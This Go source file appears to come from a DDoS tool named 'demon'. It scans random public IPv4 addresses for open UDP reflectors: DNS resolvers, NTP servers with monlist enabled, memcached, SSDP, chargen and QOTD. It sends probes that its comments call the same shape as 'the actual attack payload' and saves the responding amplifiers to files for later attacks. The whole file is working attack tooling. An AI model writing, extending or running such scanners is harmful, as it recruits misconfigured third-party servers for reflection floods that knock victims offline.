package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// udpDNSAmplifiers, udpNTPAmplifiers, udpMemcachedAmplifiers, udpSSDPAmplifiers,
// udpChargenAmplifiers, and udpQOTDAmplifiers hold runtime amplifier IP lists for
// the UDP reflection vectors. nil means the vector falls back to its built-in
// hardcoded list when one exists; discovery and explicit file lists fill the rest.
var (
	udpDNSAmplifiers       []net.IP
	udpNTPAmplifiers       []net.IP
	udpMemcachedAmplifiers []net.IP
	udpSSDPAmplifiers      []net.IP
	udpChargenAmplifiers   []net.IP
	udpQOTDAmplifiers      []net.IP
	useBuiltInReflectors   bool
)

// loadAmplifiersFromFile reads IPv4 addresses from a text file, one per line.
// blank lines and lines beginning with '#' are ignored so Shodan CSV exports
// and hand-annotated lists both work without preprocessing. lines that look
// like "ip:port" are trimmed to just the IP. unparseable lines are skipped
// silently, Shodan exports occasionally include hostname columns.
func loadAmplifiersFromFile(path string) ([]net.IP, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var out []net.IP
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// trim optional trailing port, Shodan sometimes emits "1.2.3.4:11211"
		if idx := strings.LastIndex(line, ":"); idx != -1 {
			// only strip if what follows looks like a port number, not an IPv6 colon
			if !strings.Contains(line, "::") {
				line = line[:idx]
			}
		}
		ip := net.ParseIP(strings.TrimSpace(line))
		if ip == nil {
			continue
		}
		if v4 := ip.To4(); v4 != nil {
			out = append(out, v4)
		}
	}
	if err := sc.Err(); err != nil {
		return nil, err
	}
	return out, nil
}

// discoverAmplifiers probes random public IPs for all six reflection vectors
// concurrently and stores results in the package-level amplifier vars above.
// the six protocol scans run in parallel and stop independently, each stops
// when it has found targetCount responding IPs or when the shared deadline is
// reached, whichever comes first.
//
// discovery uses ordinary UDP sockets (no raw sockets, no root required). the
// probes are legitimate service queries, a DNS NS lookup, an NTP monlist
// request, a memcached stats command, and an SSDP M-SEARCH, sent to random
// public IPs. only IPs that actively respond are kept.
func discoverAmplifiers(workers, targetCount int, timeout time.Duration) {
	workers = normalizeDiscoverWorkers(workers)
	ntpWorkers := workers / 4
	if ntpWorkers < 1 {
		ntpWorkers = 1
	}
	if targetCount <= 0 {
		targetCount = 50
	}

	deadline := time.Now().Add(timeout)

	var wg sync.WaitGroup
	wg.Add(6)

	go func() {
		defer wg.Done()
		dnsCandidates := probeSeedCandidates("dns", udpDNSAmplifiers, deadline, probeDNS)
		if len(dnsCandidates) < targetCount {
			dnsCandidates = append(dnsCandidates, probeProtocol("dns", workers, targetCount-len(dnsCandidates), deadline, probeDNS)...)
		}
		udpDNSAmplifiers = candidatesToIPs(dnsCandidates)
		for _, candidate := range dnsCandidates {
			recordReflectorObservation(candidate.IP, candidate.Protocol, true, candidate.RequestBytes, candidate.ResponseBytes, "", true)
		}
	}()
	go func() {
		defer wg.Done()
		ntpCandidates := probeSeedCandidates("ntp", udpNTPAmplifiers, deadline, probeNTPMonlist)
		if len(ntpCandidates) < targetCount {
			ntpCandidates = append(ntpCandidates, probeProtocol("ntp", ntpWorkers, targetCount-len(ntpCandidates), deadline, probeNTPMonlist)...)
		}
		// NTP probes need to catch multiple response packets to confirm monlist is
		// enabled, so each probe holds its connection open longer. fewer concurrent
		// workers keeps the read windows clean and avoids saturating the local UDP
		// receive buffer with interleaved responses from many simultaneous probes.
		udpNTPAmplifiers = candidatesToIPs(ntpCandidates)
		for _, candidate := range ntpCandidates {
			recordReflectorObservation(candidate.IP, candidate.Protocol, true, candidate.RequestBytes, candidate.ResponseBytes, "", true)
		}
	}()
	go func() {
		defer wg.Done()
		memCandidates := probeSeedCandidates("memcached", udpMemcachedAmplifiers, deadline, probeMemcached)
		if len(memCandidates) < targetCount {
			memCandidates = append(memCandidates, probeProtocol("memcached", workers, targetCount-len(memCandidates), deadline, probeMemcached)...)
		}
		udpMemcachedAmplifiers = candidatesToIPs(memCandidates)
		for _, candidate := range memCandidates {
			recordReflectorObservation(candidate.IP, candidate.Protocol, true, candidate.RequestBytes, candidate.ResponseBytes, "", true)
		}
	}()
	go func() {
		defer wg.Done()
		ssdpCandidates := probeSeedCandidates("ssdp", udpSSDPAmplifiers, deadline, probeSSDP)
		if len(ssdpCandidates) < targetCount {
			ssdpCandidates = append(ssdpCandidates, probeProtocol("ssdp", workers, targetCount-len(ssdpCandidates), deadline, probeSSDP)...)
		}
		udpSSDPAmplifiers = candidatesToIPs(ssdpCandidates)
		for _, candidate := range ssdpCandidates {
			recordReflectorObservation(candidate.IP, candidate.Protocol, true, candidate.RequestBytes, candidate.ResponseBytes, "", true)
		}
	}()
	go func() {
		defer wg.Done()
		chargenCandidates := probeSeedCandidates("chargen", udpChargenAmplifiers, deadline, probeChargen)
		if len(chargenCandidates) < targetCount {
			chargenCandidates = append(chargenCandidates, probeProtocol("chargen", workers, targetCount-len(chargenCandidates), deadline, probeChargen)...)
		}
		udpChargenAmplifiers = candidatesToIPs(chargenCandidates)
		for _, candidate := range chargenCandidates {
			recordReflectorObservation(candidate.IP, candidate.Protocol, true, candidate.RequestBytes, candidate.ResponseBytes, "", true)
		}
	}()
	go func() {
		defer wg.Done()
		qotdCandidates := probeSeedCandidates("qotd", udpQOTDAmplifiers, deadline, probeQOTD)
		if len(qotdCandidates) < targetCount {
			qotdCandidates = append(qotdCandidates, probeProtocol("qotd", workers, targetCount-len(qotdCandidates), deadline, probeQOTD)...)
		}
		udpQOTDAmplifiers = candidatesToIPs(qotdCandidates)
		for _, candidate := range qotdCandidates {
			recordReflectorObservation(candidate.IP, candidate.Protocol, true, candidate.RequestBytes, candidate.ResponseBytes, "", true)
		}
	}()

	wg.Wait()

	fmt.Printf("[discover] done — dns=%d  ntp=%d  memcached=%d  ssdp=%d  chargen=%d  qotd=%d\n",
		len(udpDNSAmplifiers), len(udpNTPAmplifiers),
		len(udpMemcachedAmplifiers), len(udpSSDPAmplifiers),
		len(udpChargenAmplifiers), len(udpQOTDAmplifiers))
}

type probeCandidate struct {
	IP            net.IP
	Protocol      string
	RequestBytes  int
	ResponseBytes int
}

func normalizeDiscoverWorkers(workers int) int {
	if workers <= 0 {
		workers = runtime.GOMAXPROCS(0)
	}
	if workers < 8 {
		workers = 8
	}
	if workers > 64 {
		workers = 64
	}
	return workers
}

func candidatesToIPs(candidates []probeCandidate) []net.IP {
	ips := make([]net.IP, 0, len(candidates))
	for _, candidate := range candidates {
		ips = append(ips, candidate.IP)
	}
	return ips
}

func loadBundledReflectorCorpus(path string) (map[string][]net.IP, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	corpus := map[string][]net.IP{}
	current := ""
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			current = strings.ToLower(strings.TrimSpace(line[1 : len(line)-1]))
			if _, ok := corpus[current]; !ok {
				corpus[current] = nil
			}
			continue
		}
		if current == "" {
			continue
		}
		ip := net.ParseIP(line)
		if ip == nil {
			continue
		}
		if v4 := ip.To4(); v4 != nil {
			corpus[current] = append(corpus[current], v4)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return corpus, nil
}

func probeSeedCandidates(name string, seeds []net.IP, deadline time.Time, probeFn func(net.IP) (bool, int, int)) []probeCandidate {
	if len(seeds) == 0 {
		return nil
	}
	if deadline.IsZero() {
		deadline = time.Now().Add(30 * time.Second)
	}

	seen := make(map[string]struct{}, len(seeds))
	out := make([]probeCandidate, 0, len(seeds))
	for _, ip := range seeds {
		if ip == nil {
			continue
		}
		key := ip.String()
		if _, dup := seen[key]; dup {
			continue
		}
		seen[key] = struct{}{}
		if time.Now().After(deadline) {
			break
		}
		if ok, requestBytes, responseBytes := probeFn(ip); ok {
			out = append(out, probeCandidate{
				IP:            ip,
				Protocol:      name,
				RequestBytes:  requestBytes,
				ResponseBytes: responseBytes,
			})
		}
	}
	fmt.Printf("[discover] %s: seed hit %d amplifiers\n", name, len(out))
	return out
}

// probeProtocol runs a fixed pool of workers, each looping over random public
// IPs and calling probeFn on them. stops once targetCount IPs have responded
// or the deadline is reached, then waits for any in-flight probes to finish
// and returns a deduplicated list with measured response sizes. every protocol
// scan calls this with its own probeFn and worker count.
func probeProtocol(name string, workers, targetCount int, deadline time.Time, probeFn func(net.IP) (bool, int, int)) []probeCandidate {
	if workers <= 0 {
		workers = 1
	}

	// buffer is larger than targetCount so that a burst of simultaneous hits
	// near the stop signal doesn't block any goroutine trying to send results.
	results := make(chan probeCandidate, targetCount+workers)

	stop := make(chan struct{})
	var stopOnce sync.Once
	var foundCount int32

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
				}
				if time.Now().After(deadline) {
					stopOnce.Do(func() { close(stop) })
					return
				}

				ip := randomPublicIPv4()
				if ok, requestBytes, responseBytes := probeFn(ip); ok {
					// non-blocking send: if the buffer is full we've already found
					// more than enough; just drop the surplus rather than stall.
					candidate := probeCandidate{IP: ip, Protocol: name, RequestBytes: requestBytes, ResponseBytes: responseBytes}
					select {
					case results <- candidate:
					default:
					}
					if int(atomic.AddInt32(&foundCount, 1)) >= targetCount {
						stopOnce.Do(func() { close(stop) })
						return
					}
				}
			}
		}()
	}

	wg.Wait()
	close(results)

	// deduplicate, multiple workers can find the same IP in a short window
	seen := make(map[string]probeCandidate)
	var out []probeCandidate
	for candidate := range results {
		k := candidate.IP.String()
		if existing, dup := seen[k]; !dup || candidate.ResponseBytes > existing.ResponseBytes {
			seen[k] = candidate
		}
	}
	for _, candidate := range seen {
		out = append(out, candidate)
	}
	fmt.Printf("[discover] %s: found %d amplifiers\n", name, len(out))
	return out
}

// probeDNS sends a DNS NS query for "." with EDNS0 (4096-byte payload, DO=1)
// to ip:53 and returns true if any response arrives. any response means the
// IP is an open resolver that processes unsolicited queries from strangers,
// exactly the property needed for DNS amplification.
func probeDNS(ip net.IP) (bool, int, int) {
	conn, err := net.DialTimeout("udp", net.JoinHostPort(ip.String(), "53"), 500*time.Millisecond)
	if err != nil {
		return false, 0, 0
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(500 * time.Millisecond)) //nolint:errcheck

	// this is the same query shape as the actual attack payload so we know the
	// resolver can serve this specific request type, not just arbitrary DNS.
	query := []byte{
		0xAB, 0xCD, // transaction ID (arbitrary, not spoofed here)
		0x01, 0x00, // flags: standard query, RD=1
		0x00, 0x01, // QDCOUNT: 1
		0x00, 0x00, // ANCOUNT: 0
		0x00, 0x00, // NSCOUNT: 0
		0x00, 0x01, // ARCOUNT: 1 (OPT record)
		0x00,       // QNAME: root
		0x00, 0x02, // QTYPE: NS
		0x00, 0x01, // QCLASS: IN
		// OPT record (EDNS0)
		0x00,       // name: root
		0x00, 0x29, // type: OPT
		0x10, 0x00, // UDP payload size: 4096
		0x00,       // extended RCODE: 0
		0x00,       // version: 0
		0x80, 0x00, // flags: DO=1 (DNSSEC OK)
		0x00, 0x00, // RDLENGTH: 0
	}
	if _, err := conn.Write(query); err != nil {
		return false, 0, 0
	}
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	// n > 12 skips malformed truncated responses; a real answer always has the
	// 12-byte DNS header plus at least the question section.
	return err == nil && n > 12, len(query), n
}

// probeNTPMonlist sends a Mode 7 REQ_MON_GETLIST_1 request to ip:123 and
// waits for multiple response packets. an unpatched ntpd that has monlist
// enabled sends up to 100 response packets (one per ~6 peer records); a
// patched server (ntpd >= 4.2.7p26) returns 0 or 1 error packets. checking
// for >= 2 packets distinguishes unpatched from patched.
func probeNTPMonlist(ip net.IP) (bool, int, int) {
	conn, err := net.DialTimeout("udp", net.JoinHostPort(ip.String(), "123"), 800*time.Millisecond)
	if err != nil {
		return false, 0, 0
	}
	defer conn.Close()

	// Mode 7 private request, same layout as the attack payload in attacks.go.
	req := [48]byte{0x17, 0x00, 0x03, 0x2a}
	conn.SetDeadline(time.Now().Add(800 * time.Millisecond)) //nolint:errcheck
	if _, err := conn.Write(req[:]); err != nil {
		return false, 0, 0
	}

	buf := make([]byte, 512)
	received := 0
	totalBytes := 0
	for i := 0; i < 4; i++ {
		conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond)) //nolint:errcheck
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			break
		}
		received++
		totalBytes += n
	}
	return received >= 2, len(req), totalBytes
}

// probeMemcached sends a UDP-framed "stats\r\n" command to ip:11211 and
// returns true if any response arrives. any response means the instance
// accepts unsolicited UDP connections from the public internet, the defining
// characteristic of an amplifiable open memcached server.
func probeMemcached(ip net.IP) (bool, int, int) {
	conn, err := net.DialTimeout("udp", net.JoinHostPort(ip.String(), "11211"), 500*time.Millisecond)
	if err != nil {
		return false, 0, 0
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(500 * time.Millisecond)) //nolint:errcheck

	// memcached UDP framing: 8-byte header (request ID, sequence number,
	// total datagrams, reserved) prepended to the ASCII command.
	req := []byte{
		0x00, 0x01, // request ID
		0x00, 0x00, // sequence number
		0x00, 0x01, // total datagrams
		0x00, 0x00, // reserved
		's', 't', 'a', 't', 's', '\r', '\n',
	}
	if _, err := conn.Write(req); err != nil {
		return false, 0, 0
	}
	buf := make([]byte, 256)
	n, err := conn.Read(buf)
	return err == nil && n > 0, len(req), n
}

// probeSSDP sends a unicast SSDP M-SEARCH to ip:1900 and returns true if any
// UPnP device at that IP responds. publicly-routable IPs that respond are
// home routers or IoT devices with UPnP accidentally exposed to the internet,
// these are the only IPs that can serve as SSDP reflectors from a remote host.
// the multicast address (239.255.255.250) only works on the same LAN segment
// and is useless from a VPS; this probe builds a list of actually-reachable
// internet-exposed devices instead.
func probeSSDP(ip net.IP) (bool, int, int) {
	conn, err := net.DialTimeout("udp", net.JoinHostPort(ip.String(), "1900"), 600*time.Millisecond)
	if err != nil {
		return false, 0, 0
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(600 * time.Millisecond)) //nolint:errcheck

	// unicast M-SEARCH: HOST is the specific device IP, not the multicast group.
	req := []byte("M-SEARCH * HTTP/1.1\r\nHOST: " + ip.String() + ":1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
	if _, err := conn.Write(req); err != nil {
		return false, 0, 0
	}
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	return err == nil && n > 0, len(req), n
}

// discoverAmplifiersToFile runs discovery and writes each protocol's results
// to a separate file so they can be reviewed and reused across runs without
// re-scanning. filenames are <prefix>_dns.txt, <prefix>_ntp.txt,
// <prefix>_memcached.txt, <prefix>_ssdp.txt, <prefix>_chargen.txt, and
// <prefix>_qotd.txt. protocols with zero discovered IPs produce no file.
func probeChargen(ip net.IP) (bool, int, int) {
	conn, err := net.DialTimeout("udp", net.JoinHostPort(ip.String(), "19"), 500*time.Millisecond)
	if err != nil {
		return false, 0, 0
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(500 * time.Millisecond)) //nolint:errcheck
	if _, err := conn.Write([]byte("\n")); err != nil {
		return false, 0, 0
	}
	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	return err == nil && n > 0, 1, n
}

func probeQOTD(ip net.IP) (bool, int, int) {
	conn, err := net.DialTimeout("udp", net.JoinHostPort(ip.String(), "17"), 500*time.Millisecond)
	if err != nil {
		return false, 0, 0
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(500 * time.Millisecond)) //nolint:errcheck
	if _, err := conn.Write([]byte("\n")); err != nil {
		return false, 0, 0
	}
	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	return err == nil && n > 0, 1, n
}

func discoverAmplifiersToFile(prefix string, workers, targetCount int, timeout time.Duration) error {
	discoverAmplifiers(workers, targetCount, timeout)

	type proto struct {
		name string
		ips  []net.IP
	}
	protocols := []proto{
		{"dns", udpDNSAmplifiers},
		{"ntp", udpNTPAmplifiers},
		{"memcached", udpMemcachedAmplifiers},
		{"ssdp", udpSSDPAmplifiers},
		{"chargen", udpChargenAmplifiers},
		{"qotd", udpQOTDAmplifiers},
	}

	for _, p := range protocols {
		if len(p.ips) == 0 {
			continue
		}
		fname := prefix + "_" + p.name + ".txt"
		f, err := os.Create(fname)
		if err != nil {
			return fmt.Errorf("writing %s: %w", fname, err)
		}
		w := bufio.NewWriter(f)
		fmt.Fprintf(w, "# %s amplifiers discovered by demon -discover-amplifiers\n", p.name)
		for _, ip := range p.ips {
			fmt.Fprintln(w, ip.String())
		}
		if flushErr := w.Flush(); flushErr != nil {
			f.Close()
			return fmt.Errorf("flushing %s: %w", fname, flushErr)
		}
		f.Close()
		fmt.Printf("[discover] wrote %d %s IPs to %s\n", len(p.ips), p.name, fname)
	}
	return nil
}
